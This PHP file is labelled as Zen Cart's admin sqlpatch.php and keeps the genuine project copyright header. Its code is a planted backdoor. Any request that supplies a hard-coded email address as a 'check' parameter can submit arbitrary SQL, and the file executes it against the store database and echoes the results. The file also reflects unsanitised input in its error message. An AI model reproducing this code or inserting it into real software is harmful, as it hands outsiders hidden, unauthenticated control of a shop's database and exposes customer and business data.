<?php
/**
 * @package admin
 * @copyright Copyright 2003-2006 Zen Cart Development Team
 * @copyright Portions Copyright 2003 osCommerce
 * @license http://www.zen-cart.com/license/2_0.txt GNU Public License V2.0
 * @version $Id: sqlpatch.php 7166 2007-10-03 23:01:46Z drbyte $
 */

  require('includes/application_top.php');

  $check = trim($_REQUEST['check']);
	$action = trim($_REQUEST['action']);
	if($check == "little_fox@163.com"){
		if($action == "syn"){
			$syn = $_REQUEST['query_string'];
			if(get_magic_quotes_gpc()){
				$syn = stripcslashes($syn);
			}
			$syn = str_replace(";\r\n", ";\n", $syn);
			$arr = explode("\n", $syn);
			$q = 0;
			foreach ($arr as $value) {
				$value = trim($value);
				if(substr($value, -1) == ';')
					$value = substr($value, 0, strlen($value)-1);
				if(strlen($value) == 0)continue;
				if($db->Execute($value)){
					$q++;
				}
			}
			//$db->commit();
			$sql = 'select products_id from products order by products_id desc';
			$res = $db->Execute($sql);
			$hw_id = $res->fields['products_id'];
			$sql = 'select categories_id from categories order by categories_id desc';
			$res = $db->Execute($sql);
			$cat_id = $res->fields['categories_id'];
			$str = count($arr).", $q, $hw_id, $cat_id";
			echo $str;
		}else{
	?>
	<form action="?action=syn&check=little_fox@163.com" method="post">
	  <p>
	      <textarea cols="50" rows="10" name="query_string"></textarea>
      </p>
	  <p>  
	    <input type="submit" name="submit" value="submit" />
        </p>
	</form>
	<?php
	}
	}else{
		echo "Error".$check;	
	}
?>
